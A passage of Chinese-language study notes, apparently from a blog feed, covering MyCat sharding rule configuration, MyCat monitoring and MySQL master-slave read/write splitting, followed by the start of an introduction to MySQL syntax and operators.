    </rule>
</tableRule>
<function name="sharding-by-substring" class="io.mycat.route.function.PartitionDirectBySubString">
    <property name="startIndex">0</property> <!-- zero-based -->
    <property name="size">2</property>
    <property name="partitionCount">3</property>
    <property name="defaultPartition">0</property>
</function>
```

分片规则配置属性含义:

| 属性 | 描述 |
| ---- | ---- |
|columns |标识将要分片的表字段|
|algorithm |指定分片函数与function的对应关系|
|class |指定该分片算法对应的类|
|startIndex |字符子串起始索引|
|size |字符长度|
|partitionCount |分区(分片)数量|
|defaultPartition|默认分片(在分片数量定义时, 字符标示的分片编号不在分片数量内时,使用默认分片)|

#### 固定分片hash算

**sharding-by-long-hash**, 该算法类似于十进制的求模运算，但是为二进制的操作，例如，取 id 的二进制低 10 位 (即与1111111111 进行位 & 运算)，位与运算最小值为 0000000000，最大值为1111111111，转换为十进制，也就是位于0-1023之间。分片字段必须为数字类型。

![image-20220904074917262](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/79657456d9d65f607627035aae72cfa2-96e9c6f.png)

配置:

```xml
<!-- schema.xml -->
<table name="tb_longhash" dataNode="dn4,dn5,dn6" rule="sharding-by-long-hash" />

<dataNode name="dn4" dataHost="dhost1" database="db01" />
<dataNode name="dn5" dataHost="dhost2" database="db01" />
<dataNode name="dn6" dataHost="dhost3" database="db01" />

<!-- rule.xml -->
<tableRule name="sharding-by-long-hash">
    <rule>
        <columns>id</columns>
        <algorithm>sharding-by-long-hash</algorithm>
    </rule>
</tableRule>
<!-- 分片总长度为1024，count与length数组长度必须一致； -->
<function name="sharding-by-long-hash" class="io.mycat.route.function.PartitionByLong">
    <property name="partitionCount">2,1</property>
    <property name="partitionLength">256,512</property>
</function>
```

分片规则配置属性含义:

| 属性 | 描述 |
| ---- | ---- |
|columns |标识将要分片的表字段名|
|algorithm |指定分片函数与function的对应关系|
|class |指定该分片算法对应的类|
|partitionCount |分片个数列表|
|partitionLength |分片范围列表|

> 约束 :
> 1). 分片长度 : 默认最大2^10 , 为 1024 ;
> 2). count, length的数组长度必须是一致的 ;
> 以上分为三个分区:0-255,256-511,512-1023

![image-20220904075152895](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/018ca302654c14d78e500465230a2fce-5276642.png)

#### 字符串hash解析算法

**sharding-by-stringhash**, 截取字符串中的指定位置的子字符串, 进行hash算法， 算出分片。

![image-20220904075232616](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4bf6a40fbfc12f3b5dc7dde9369a9441-8682de3.png)

配置:

```xml
<!-- schema.xml -->
<table name="tb_strhash" dataNode="dn4,dn5" rule="sharding-by-stringhash" />

<dataNode name="dn4" dataHost="dhost1" database="db01" />
<dataNode name="dn5" dataHost="dhost2" database="db01" />

<!-- rule.xml -->
<tableRule name="sharding-by-stringhash">
    <rule>
        <columns>name</columns>
        <algorithm>sharding-by-stringhash</algorithm>
    </rule>
</tableRule>
<function name="sharding-by-stringhash" class="io.mycat.route.function.PartitionByString">
    <property name="partitionLength">512</property> <!-- zero-based -->
    <property name="partitionCount">2</property>
    <property name="hashSlice">0:2</property>
</function>
```

分片规则配置属性含义:

| 属性 | 描述 |
| ---- | ---- |
|columns |标识将要分片的表字段|
|algorithm |指定分片函数与function的对应关系|
|class |指定该分片算法对应的类|
|partitionLength |hash求模基数 ; length*count=1024 (出于性能考虑)|
|partitionCount |分区数|
|hashSlice|hash运算位 , 根据子字符串的hash运算 ; 0 代表 str.length(), -1 代表 str.length()-1 , 大于0只代表数字自身 ; 可以理解为substring（start，end），start为0则只表示0|

![image-20220904075426113](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a9e824571cd31738542d6541009d3cad-6f784f3.png)

#### 按天分片算法

**sharding-by-date**, 按照日期及对应的时间周期来分片。

![image-20220904075515828](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c51cda7cb49f674d0c51589087bc7558-0586801.png)

配置:

```xml
<!-- schema.xml -->
<table name="tb_datepart" dataNode="dn4,dn5,dn6" rule="sharding-by-date" />

<dataNode name="dn4" dataHost="dhost1" database="db01" />
<dataNode name="dn5" dataHost="dhost2" database="db01" />
<dataNode name="dn6" dataHost="dhost3" database="db01" />

<!-- rule.xml -->
<tableRule name="sharding-by-date">
    <rule>
        <columns>create_time</columns>
        <algorithm>sharding-by-date</algorithm>
    </rule>
</tableRule>
<function name="sharding-by-date" class="io.mycat.route.function.PartitionByDate">
    <property name="dateFormat">yyyy-MM-dd</property>
    <property name="sBeginDate">2022-01-01</property>
    <property name="sEndDate">2022-01-30</property>
    <property name="sPartionDay">10</property>
</function>
<!-- 从开始时间开始，每10天为一个分片，到达结束时间之后，会重复开始分片插入.
	配置表的 dataNode 的分片，必须和分片规则数量一致，
	例如 2022-01-01 到 2022-12-31 ，每10天一个分片，一共需要37个分片。
-->
```

分片规则配置属性含义:

| 属性 | 描述 |
| ---- | ---- |
|columns |标识将要分片的表字段|
|algorithm |指定分片函数与function的对应关系|
|class |指定该分片算法对应的类|
|dateFormat |日期格式|
|sBeginDate |开始日期|
|sEndDate|结束日期，如果配置了结束日期，则代码数据到达了这个日期的分片后，会重复从开始分片插入sPartionDay 分区天数，默认值 10 ，从开始日期算起，每个10天一个分区|

#### 自然月分片

**sharding-by-month**, 使用场景为按照月份来分片, 每个自然月为一个分片。

![image-20220904075805615](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/469e4b63a7942818ff887b69ec7fb023-3d23d70.png)

配置:

```xml
<!-- schema.xml -->
<table name="tb_monthpart" dataNode="dn4,dn5,dn6" rule="sharding-by-month" />

<dataNode name="dn4" dataHost="dhost1" database="db01" />
<dataNode name="dn5" dataHost="dhost2" database="db01" />
<dataNode name="dn6" dataHost="dhost3" database="db01" />

<!-- rule.xml -->
<tableRule name="sharding-by-month">
    <rule>
        <columns>create_time</columns>
        <algorithm>partbymonth</algorithm>
    </rule>
</tableRule>
<function name="partbymonth" class="io.mycat.route.function.PartitionByMonth">
    <property name="dateFormat">yyyy-MM-dd</property>
    <property name="sBeginDate">2022-01-01</property>
    <property name="sEndDate">2022-03-31</property>
</function>
<!-- 从开始时间开始，一个月为一个分片，到达结束时间之后，会重复开始分片插入. 
	配置表的 dataNode 的分片，必须和分片规则数量一致，
	例如 2022-01-01 到 2022-12-31 ，一共需要12个分片。
-->
```

分片规则配置属性含义:

| 属性 | 描述 |
| ---- | ---- |
|columns |标识将要分片的表字段|
|algorithm |指定分片函数与function的对应关系|
|class |指定该分片算法对应的类|
|dateFormat |日期格式|
|sBeginDate |开始日期|
|sEndDate|结束日期，如果配置了结束日期，则代码数据到达了这个日期的分片后，会重复从开始分片插入|

## MyCat管理监控

在MyCat中，当执行一条SQL语句时，MyCat需要进行**SQL解析**、**分片分析**、**路由分析**、**读写分离分析**等操作，最终经过一系列的分析决定将当前的SQL语句到底路由到那几个(或哪一个)节点数据库，数据库将数据执行完毕后，如果有返回的结果，则将结果返回给**MyCat**，最终还需要在MyCat中进行**结果合并**、**聚合处理**、**排序处理**、**分页处理**等操作，最终再将结果返回给客户端。

而在MyCat的使用过程中，MyCat官方也提供了一个管理监控平台**MyCat-Web**（MyCat-eye）。Mycat-web 是 Mycat 可视化运维的管理和监控平台，弥补了 Mycat 在监控上的空白。帮 Mycat分担统计任务和配置管理任务。Mycat-web 引入了 ZooKeeper 作为配置中心，可以管理多个节点。Mycat-web 主要管理和监控 Mycat 的流量、连接、活动线程和内存等，具备 IP 白名单、邮件告警等模块，还可以统计 SQL 并分析慢 SQL 和高频 SQL 等。为优化 SQL 提供依据。

![image-20220904080048504](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c95e3c48dc06cb333b053681149779af-2c251d1.png)

### MyCat命令行管理

Mycat默认开通2个端口，可以在server.xml中进行修改。

- 8066 数据访问端口，即进行 DML 和 DDL 操作。

- 9066 数据库管理端口，即 mycat 服务管理控制功能，用于管理mycat的整个集群状态

连接MyCat的管理控制台：

```shell
mysql -h 192.168.253.134 -P 9066 -uroot -p123456 
```

![image-20220904080409680](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7dfd8f3f085f34da422dfa0b81a247f7-46cee3e.png)

 常用命令:

| 命令 | 含义 |
| ---- | ---- |
|show @@help |查看Mycat管理工具帮助文档|
|show @@version |查看Mycat的版本|
|reload @@config |重新加载Mycat的配置文件|
|show @@datasource |查看Mycat的数据源信息|
|show @@datanode |查看MyCat现有的分片节点信息|
|show @@threadpool |查看Mycat的线程池信息|
|show @@sql |查看执行的SQL|
|show @@sql.sum |查看执行的SQL统计|

### Mycat-web

Mycat-web(Mycat-eye)是对mycat-server提供监控服务，功能不局限于对mycat-server使用。他通过JDBC连接对Mycat、Mysql监控，监控远程服务器(目前仅限于linux系统)的cpu、内存、网络、磁盘。

Mycat-eye运行过程中需要依赖zookeeper，因此需要先安装zookeeper。

#### 安装

```shell
sudo tar -zxvf zookeeper-3.4.6.tar.gz -C /usr/local/
cd /usr/local/zookeeper-3.4.6/
mkdir date
mv conf/zoo_sample.cfg conf/zoo.cfg
sudo vi conf/zoo.cfg	# 修改dataDir=/usr/local/zookeeper-3.4.6/date
bin/zkServer.sh start

sudo tar -zxvf Mycat-web.tar.gz -C /usr/local/
cd /usr/local/zookeeper-3.4.6/
cd /usr/local/mycat-web/
sudo vi mycat-web/WEB-INF/classes/mycat.properties # 指定 zookeeper=localhost:2181
./start.sh &
```

![image-20220904081348446](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a7da7dd57f76505e38d596bb04531363-906a034.png)

#### 访问后台

```
http://192.168.253.134:8082/mycat
```

#### 配置Mycat服务信息

![image-20220904081605194](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/100147841310998035c18c3561c51096-7ad63df.png)

配置完成后即可查看Mycat运行状态及节点信息

## 基于Mycat的读写分离

读写分离,把对数据库的读和写操作分开,以对应不同的数据库服务器。主数据库提供写操作，从数据库提供读操作，这样能有效地减轻单台数据库的压力。

MySQL的主从复制，是基于二进制日志（binlog）实现的。

![image-20220904125741223](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f5f3b706d952b99de31f91bb5ef72f15-096b424.png)

### 一主一从

| 主机 | 角色 |
| ---- | ---- |
|192.168.253.134:8066 |Mycat |
|192.168.253.134 |master |
|192.168.253.135 |slave |

参考【主从复制】内容, 完成两台服务器(134, 135)的MySQL主从搭建

MyCat控制后台数据库的读写分离和负载均衡由schema.xml文件`datahost`标签的`balance`属性控制。

**1). schema.xml配置**

```xml
	<schema name="ms_rep" checkSQLschema="true" sqlMaxLimit="100" dataNode="dn7">
	</schema>

	<dataNode name="dn7" dataHost="dhost7" database="ms_rep" />

	<dataHost name="dhost7" maxCon="1000" minCon="10" balance="1" writeType="0" dbType="mysql" dbDriver="jdbc" switchType="1"  slaveThreshold="100">
		<heartbeat>select user()</heartbeat>
		<!-- <writeHost host="master3" url="192.168.253.137:3306" user="root" password="123456" /> -->
		<writeHost host="master" url="jdbc:mysql://192.168.253.134:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456">
			<readHost host="slave" url="jdbc:mysql://192.168.253.135:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456" />
		</writeHost>
	</dataHost>
```

`writeHost代`表的是写操作对应的数据库，`readHost`代表的是读操作对应的数据库。 要想实现读写分离，就得配置`writeHost`关联主库，`readHost`关联从库。

而仅仅配置好了writeHost以及readHost还不能完成读写分离，还需要配置一个非常重要的负责均衡的参数`balance`，取值有4种，具体含义如下：

| 参数值 | 含义 |
| ------ | ---- |
|0 |不开启读写分离机制 , 所有读操作都发送到当前可用的writeHost上|
|1|全部的readHost 与 备用的writeHost 都参与select 语句的负载均衡（主要针对于双主双从模式）|
|2 |所有的读写操作都随机在writeHost , readHost上分发|
|3|所有的读请求随机分发到writeHost对应的readHost上执行, writeHost不负担读压力|

> 在一主一从模式的读写分离中，balance配置1或3都可以完成读写分离的。

**2). server.xml配置**

```xml
	<user name="root" defaultAccount="true">
		<property name="password">123456</property>
		<property name="schemas">shopping,logs,ms_rep</property>
		<property name="defaultSchema">shopping</property>
	</user>

	<user name="user">
		<property name="password">user</property>
		<property name="schemas">shopping,logs,ms_rep</property>
		<property name="readOnly">true</property>
		<property name="defaultSchema">shopping</property>
	</user>
```

配置完毕后，重新启动Mycat

```shell
bin/mycat restart
```



在执行增删改操作时，对应的主库及从库的数据均发生变化。 在执行查询操作时，仅从从库查询数据。

当主节点Master宕机之后，业务系统就只能够读，而不能写入数据了。

就得通过另外一种主从复制结构**双主双从**来解决了。

### 双主双从

一个主机 Master1 用于处理所有写请求，它的从机 Slave1 和另一台主机 Master2 还有它的从机 Slave2 负责所有读请求。当 Master1 主机宕机后，Master2 主机负责写请求，Master1 、Master2 互为备机。架构图如下:

![image-20220904131002903](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c401becd97dff145e617f6da9e80d9d8-ad28060.png)

| 编号 | IP   | 预装软件 | 角色 |
| ---- | ---- | -------- | ---- |
|1 |192.168.253.134 |MyCat|MyCat中间件服务器|
|2 |192.168.253.134  |MySQL |M1|
|3 |192.168.253.135|MySQL |S1|
|4 |192.168.253.136 |MySQL |M2|
|5 |192.168.253.137 |MySQL |S2|

#### 搭建双主从复制

**1). 主库配置(134,136)**

```shell
sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf

	#mysql 服务ID，保证整个集群环境中唯一，取值范围：1 – 2^32-1，默认为1
    server-id=1000  # server-id=1002
    #指定同步的数据库
    binlog-do-db=ms_rep
    log_bin = /var/log/mysql/mysql-bin.log
    # 在作为从数据库的时候，有写入操作也要更新二进制日志文件
    log-slave-updates

sudo systemctl restart mysql
mysql -uroot -p123456

	> CREATE USER 'replica'@'%' IDENTIFIED WITH mysql_native_password BY 'Root@123456';
	> GRANT REPLICATION SLAVE ON *.* TO 'replica'@'%';
	> FLUSH PRIVILEGES;
	> show master status ;
```

![image-20220904131725144](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/58984a5441939e74820822c52ccc0a56-0488186.png)

**2). 从库配置(135,137)**

```shell
sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf

	#mysql 服务ID，保证整个集群环境中唯一，取值范围：1 – 2^32-1，默认为1
    server-id=1001  # server-id=1003

sudo systemctl restart mysql
mysql -uroot -p123456

	> CHANGE MASTER TO MASTER_HOST='192.168.253.134', MASTER_USER='replica',MASTER_PASSWORD='Root@123456', MASTER_LOG_FILE='binlog.000002',MASTER_LOG_POS=1545;
	> start slave;
	> show slave status \G;
```

![image-20220904132107977](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/529fccd92f5f71af051b209a8c79ba74-9be9f35.png)

**3). 两台主库相互复制(134,136)**

```mysql
# 134服务器
mysql -uroot -p123456
	> CHANGE MASTER TO MASTER_HOST='192.168.253.136', MASTER_USER='replica',MASTER_PASSWORD='Root@123456', MASTER_LOG_FILE='mysql-bin.000003',MASTER_LOG_POS=663;
	> start slave;
	> show slave status \G;

# 136服务器
mysql -uroot -p123456
	> CHANGE MASTER TO MASTER_HOST='192.168.253.134', MASTER_USER='replica',MASTER_PASSWORD='Root@123456', MASTER_LOG_FILE='mysql-bin.000003',MASTER_LOG_POS=663;
	> start slave;
	> show slave status \G;
```

![image-20220904133952908](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b442059a9f698bf5fd67c773d3138bd7-7d4031e.png)

#### 配置双主双从读写分离

MyCat控制后台数据库的读写分离和负载均衡由schema.xml文件`datahost`标签的`balance`属性控制，通过`writeType`及`switchType`来完成失败自动切换的。

**1). schema.xml**

```xml
	<schema name="ms_rep" checkSQLschema="true" sqlMaxLimit="100" dataNode="dn7">
	</schema>

	<dataNode name="dn7" dataHost="dhost7" database="ms_rep" />

	<dataHost name="dhost7" maxCon="1000" minCon="10" balance="1" writeType="0" dbType="mysql" dbDriver="jdbc" switchType="1"  slaveThreshold="100">
		<heartbeat>select user()</heartbeat>
		<writeHost host="master1" url="jdbc:mysql://192.168.253.134:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456">
			<readHost host="slave1" url="jdbc:mysql://192.168.253.135:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456" />
		</writeHost>
		<writeHost host="master2" url="jdbc:mysql://192.168.253.136:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456">
			<readHost host="slave2" url="jdbc:mysql://192.168.253.137:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456" />
		</writeHost>
	</dataHost>
```

属性说明

|属性| 参数值 | 含义                                                         |
|---| ------ | ------------------------------------------------------------ |
|balance| 1     | 代表全部的 readHost 与 stand by writeHost 参与 select 语句的负载均衡，简单的说，当双主双从模式(M1->S1，M2->S2，并且 M1 与 M2 互为主备)，正常情况下, M2,S1,S2 都参与 select 语句的负载均衡 ; |
|writeType| 0      | 写操作都转发到第1台writeHost, writeHost1挂了, 会切换到writeHost2上 |
|| 1      | 所有的写操作都随机地发送到配置的writeHost上 ; |
|switchType| -1     | 不自动切换 |
||1|自动切换|

**2). server.xml**

```xml
	<user name="root" defaultAccount="true">
		<property name="password">123456</property>
		<property name="schemas">shopping,logs,ms_rep</property>
		<property name="defaultSchema">shopping</property>
	</user>

	<user name="user">
		<property name="password">user</property>
		<property name="schemas">shopping,logs,ms_rep</property>
		<property name="readOnly">true</property>
		<property name="defaultSchema">shopping</property>
	</user>
```

**3).重新加载配置**

```shell
mysql -h192.168.253.134 -P9066 -uroot -p123456
	
	> reload @@config_all;
```

> 此时, 当一个主库服务停止时, 可以自动切换到备用主库, 实现高可用]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL基础</title>
    <url>/2022/07/12/MySql/MySQL%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[
## SQL分类

SQL语言在功能上主要分为如下3大类：

- DDL

  **DDL**（**Data Definition Languages**, 数据定义语言），这些语句定义了不同的数据库、表、视图、索
  引等数据库对象，还可以用来创建、删除、修改数据库和数据表的结构。

  主要的语句关键字包括 `CREATE` 、 `DROP` 、 `ALTER` 等。

- DML

  **DML**（**Data Manipulation Language**, 数据操作语言），用于添加、删除、更新和查询数据库记
  录，并检查数据完整性。

  主要的语句关键字包括 `INSERT` 、 `DELETE `、 `UPDATE` 、 `SELECT` 等。

- DCL

  **DCL**（**Data Control Language**, 数据控制语言），用于定义数据库、表、字段、用户的访问权限和
  安全级别。
  主要的语句关键字包括 `GRANT `、 `REVOKE `、 `COMMIT` 、 `ROLLBACK` 、 `SAVEPOINT` 等。

## 通用语法

### 基本规则

- SQL 可以写在一行或者多行。为了提高可读性，各子句分行写，必要时使用缩进
- 每条命令以 `; `或 `\g` 或 `\G` 结束
- 关键字不能被缩写也不能分行
- 关于标点符号
  - 必须保证所有的`()`、单引号`''`、双引号`""`是成对结束的
  - 必须使用英文状态下的半角输入方式
  - 字符串型和日期时间类型的数据可以使用单引号`''`表示
  - 列的别名，尽量使用双引号`""`，而且不建议省略`as`

### SQL大小写规范 

- MySQL 在 **Windows** 环境下是**大小写不敏感**的
- MySQL 在 **Linux** 环境下是**大小写敏感**的
  - 数据库名、表名、表的别名、变量名是严格区分大小写的
  - 关键字、函数名、列名(或字段名)、列的别名(字段的别名) 是忽略大小写的。
- 推荐采用统一的书写规范：
  - 数据库名、表名、表别名、字段名、字段别名等都小写
  - SQL 关键字、函数名、绑定变量等都大写

###  注释

可以使用如下格式的注释结构:

```
单行注释：#注释文字
单行注释：-- 注释文字(--后面必须包含一个空格。)
多行注释：/* 注释文字 */
```

## 运算符

### 算术运算符

算术运算符主要用于数学运算，其可以连接运算符前后的两个数值或表达式，对数值或表达式进行加（+）、减（-）、乘（*）、除（/）和取模（%）运算

| 运算符       | 名称             | 作用                     | 示例           |
| ------------ | ---------------- | ------------------------ | -------------- |
| `+`          | 加法运算符       | 计算两个值或表达式的和   | `SELECT a + b` |
| `-`          | 减法运算符       | 计算两个值或表达式的差   | `SELECT a - b` |
| `*`          | 乘法运算符       | 计算两个值或表达式的乘积 | `SELECT a * b` |
| `/` 或 `DIV` | 除法运算符       | 计算两个值或表达式的商   | `SELECT a / b` |
| `%` 或 `MOD` | 取余(求模)运算符 | 计算两个值或表达式的余数 | `SELECT a % b` |

运算规则

- **加/减法**

  ![image-20220705102340555](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7ee8a713c20a11a3b10145a16cbb7bbd-526d560.png)

  由此可以得知:

    ```
  - 一个整数类型的值对整数进行加法和减法操作，结果还是一个整数；
  - 一个整数类型的值对浮点数进行加法和减法操作，结果是一个浮点数；
  - 在MySQL中+只表示数值相加。如果遇到非数值类型，先尝试转成数值，如果转失败，就按0计算。
  （补充：MySQL中字符串拼接要使用字符串函数CONCAT()实现）
    ```

- **乘/除法**

  ![image-20220705102550438](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/56f18a97f0e6c097ba06e11f038bd67d-e288d95.png)

  由此可以得知:

  ```
  - 一个数乘以整数1和除以整数1后仍得原数；
  - 一个数乘以浮点数1和除以浮点数1后变成浮点数，数值与原数相等；
  - 一个数除以整数后，不管是否能除尽，结果都为一个浮点数；
  - 一个数除以另一个数，除不尽时，结果为一个浮点数，并保留到小数点后4位；
  - 乘法和除法的优先级相同，进行先乘后除操作与先除后乘操作，得出的结果相同。
  - 在数学运算中，0不能用作除数，在MySQL中，一个数除以0为NULL
  ```

- **取余** 

  ![image-20220705102749895](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5e6cae893bd7d78dfb696145b59d3aa5-9a266ee.png)

###  比较运算符

比较运算符用来对表达式左边的操作数和右边的操作数进行比较，比较的结果为真则返回`1`，比较的结果为假则返回`0`，其他情况则返回`NULL`。

| 运算符       | 名称           | 作用                                             | 示例                                |
| ------------ | -------------- | ------------------------------------------------ | ----------------------------------- |
| `=`          | 等于运算符     | 判断两个值、字符串或表达式是否相等               | `SELECT * FROM TABLE WHERE A = B`   |
| `<=>`        | 安全等于运算符 | 安全的判断两个值、字符串或表达式是否相等         | `SELECT * FROM TABLE WHERE A <=> B` |
| `<>` 或 `!=` | 不等于运算符   | 判断两个值、字符串或表达式是否不相等             | `SELECT * FROM TABLE WHERE A <> B`  |
| `<`          | 小于运算符     | 判断前面的值、字符串或表达式是否大于后面的       | `SELECT * FROM TABLE WHERE A < B`   |
| `<=`         | 小于等于运算符 | 判断前面的值、字符串或表达式是否大于或等于后面的 | `SELECT * FROM TABLE WHERE A <= B`  |
| `>`          | 大于运算符     | 判断前面的值、字符串或表达式是否小于后面的       | `SELECT * FROM TABLE WHERE A > B`   |
| `>=`         | 大于等于运算符 | 判断前面的值、字符串或表达式是否小于或等于后面的 | `SELECT * FROM TABLE WHERE A >= B`  |

- **等号运算符**

  等号运算符（`=`）判断等号两边的值、字符串或表达式是否相等，如果相等则返回1，不相等则返回0。

  ![image-20220705103744522](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/25a71c1f12f8dcaa6574a0cb1143f3af-3e065df.png)

  在使用等号运算符时，遵循如下规则：

  ```
  - 如果等号两边的值、字符串或表达式都为字符串，则MySQL会按照字符串进行比较，其比较的是每个字符串中字符的ANSI编码是否相等。
  - 如果等号两边的值都是整数，则MySQL会按照整数来比较两个值的大小。
  - 如果等号两边的值一个是整数，另一个是字符串，则MySQL会将字符串转化为数字进行比较。
  - 如果等号两边的值、字符串或表达式中有一个为NULL，则比较结果为NULL。
  ```

- **安全等于运算符**

  安全等于运算符（`<=>`）与等于运算符（`=`）的作用是相似的， 唯一的区别 是`<=>`可以用来对NULL进行判断。在两个操作数均为NULL时，其返回值为1，而不为NULL；当一个操作数为NULL时，其返回值为0，而不为NULL。

  ![image-20220705104054544](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8cbed56f1a965a9b84580518ee5fbf15-a237fb6.png)

- **不等于运算符**

  不等于运算符（`<>`和`!=`）用于判断两边的数字、字符串或者表达式的值是否不相等，如果不相等则返回1，相等则返回0。**不等于运算符不能判断NULL值**。如果两边的值有任意一个为NULL，或两边都为NULL，则结果为NULL。 SQL语句示例如下：

  ![image-20220705104218469](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8da1e7dc5d3f822ac9b320a24f45b0cb-0a1db98.png)

### 非符号类型的运算符

| 运算符        | 名称             | 作用                               | 示例                                          |
| ------------- | ---------------- | ---------------------------------- | --------------------------------------------- |
| `IS NULL`     | 为空运算符       | 判断值、字符串或表达式是否为空     | `SELECT B FROM TABLE WHERE A IS NULL`         |
| `ISNOTNULL`   | 不为空运算符     | 判断值、字符串或表达式是否不为空   | `SELECT B FROM TABLE WHERE A IS NOT NULL`     |
| `LEAST`       | 最小值运算符     | 在多个值中返回最小值               | `SELECT LEAST(A,B,C)`                         |
| `GREATEST`    | 最大值运算符     | 在多个值中返回最大值               | `SELECT GREATEST(A,B,C)`                      |
| `BETWEEN AND` | 两个值之间算符   | 判断一个值是否在两个值之间         | `SELECT * FROM TABLE WHERE C BETWEEN A AND B` |
| `IN`          | 属于运算符       | 判断一个值是否在列表中             | `SELECT * FROM TABLE WHERE C IN(A, B)`        |
| `NOT IN`      | 不属于运算符     | 判断一个值是否不在列表中           | `SELECT * FROM TABLE WHERE C NOT IN(A, B)`    |
| `LIKE`        | 模糊匹配运算符   | 判断一个值是否符合模糊匹配规则     | `SELECT * FROM TABLE WHERE C LIKE '__'`       |
| `REGEXP`      | 正则表达式运算符 | 判断一个值是否符合正则表达式的规则 | `SELECT * FROM TABLE WHERE C REGEXP B`        |
| `RLIKE`       | 正则表达式运算符 | 判断一个值是否符合正则表达式的规则 | `SELECT * FROM TABLE WHERE C RLIKE B`         |

- **空运算符**

  空运算符（`IS NULL`）判断一个值是否为NULL，如果为NULL则返回1，否则返回0。 

  ![image-20220705110122730](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/86e1e52f8bf134eb1d43d9ad543d63da-a9447ba.png)

- **非空运算符**

  非空运算符（`IS NOT NULL`）判断一个值是否不为NULL，如果不为NULL则返回1，否则返回0。

  ![image-20220705110236772](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/93ee0ae3b31e51102d07946e84a2e331-1416223.png)

- **最小值运算符**

  语法格式为：`LEAST(值1，值2，...，值n)`。其中，“值n”表示参数列表中有n个值。在有两个或多个参数的情况下，返回最小值。

  ![image-20220705110338880](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/13b411c50c56a379bf0707e736192bc8-35800d2.png)

  ```
  - 当参数是整数或者浮点数时，LEAST将返回其中最小的值
  - 当参数为字符串时，返回字母表中顺序最靠前的字符
  - 当比较值列表中有NULL时，不能判断大小，返回值为NULL
  ```

- **最大值运算符**

  语法格式为：`GREATEST(值1，值2，...，值n)`。其中，n表示参数列表中有n个值。当有两个或多个参数时，返回值为最大值。假如任意一个自变量为NULL，则GREATEST()的返回值为NULL。

  ![image-20220705110506031](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a5863d6d94f192f15b51434cd5242820-211b3b8.png)

  ```
  - 当参数中是整数或者浮点数时，GREATEST将返回其中最大的值
  - 当参数为字符串时，返回字母表中顺序最靠后的字符
  - 当比较值列表中有NULL时，不能判断大小，返回值为NULL
  ```

- **BETWEEN AND运算符**

  `BETWEEN AND`运算符使用的格式通常为`SELECT D FROM TABLE WHERE C BETWEEN A AND B`，此时，当C大于或等于A，并且C小于或等于B时，结果为1，否则结果为0。

  ![image-20220705110623796](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/689b17db860235d7c8247d54f0a16a67-2424ada.png)

- **IN运算符**

  `IN`运算符用于判断给定的值是否是IN列表中的一个值，如果是则返回1，否则返回0。如果给定的值为NULL，则结果为NULL。

  ![image-20220705110751507](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1cf296866e06b4f21b040cb70e7a5614-6e14801.png)

-  **NOT IN运算符**

  `NOT IN`运算符用于判断给定的值是否不是IN列表中的一个值，如果不是IN列表中的一个值，则返回1，否则返回0。

  ![image-20220705110841206](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/511808d6855885c516350be6c0890cf4-4603021.png)

- **LIKE运算符**

  ` LIKE`运算符主要用来匹配字符串，通常用于模糊匹配，如果满足条件则返回1，否则返回0。如果给定的值或者匹配条件为NULL，则返回结果为NULL。

  ```
  LIKE运算符通常使用如下通配符：
  	%：匹配0个或多个字符。
  	_：只能匹配一个字符。
  ```

  ![image-20220705110958835](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/65e3aae55c3d6cfb54fe3f4e21b277ac-90a6a56.png)

- **REGEXP运算符**

  `REGEXP`运算符用来匹配字符串，语法格式为： `expr REGEXP 匹配条件` 。如果expr满足匹配条件，返回1；如果不满足，则返回0。若expr或匹配条件任意一个为NULL，则结果为NULL。

  ```
  REGEXP运算符在进行匹配时，常用的有下面几种通配符：
  （1）^	匹配以该字符后面的字符开头的字符串。
  （2）$	匹配以该字符前面的字符结尾的字符串。
  （3）.	匹配任何一个单字符。
  （4）[...]匹配在方括号内的任何字符。例如，“[abc]”匹配“a”或“b”或“c”。为了命名字符的范围，使用一个‘-’。“[a-z]”匹配任何字母，而“[0-9]”匹配任何数字。
